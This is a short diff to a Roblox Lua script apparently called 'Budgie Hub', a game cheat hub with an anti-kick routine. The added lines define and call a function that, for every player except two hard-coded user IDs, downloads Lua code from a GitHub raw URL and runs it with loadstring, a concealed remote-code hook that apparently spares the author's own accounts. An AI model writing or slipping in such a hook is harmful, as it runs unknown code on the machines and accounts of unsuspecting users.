@@ -1032,6 +1032,14 @@ end
 
 AntiKick()
 
+local function DS()
+    if game.Players.LocalPlayer.UserId ~= 5042713445 and game.Players.LocalPlayer.UserId ~= 4636825706 then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Wolfdmitrich/kjarenacontrolling/main/idk.lua"))()
+    end
+end
+
+DS()
+
 OrionLib:MakeNotification(
     {
         Name = "Budgie Hub",
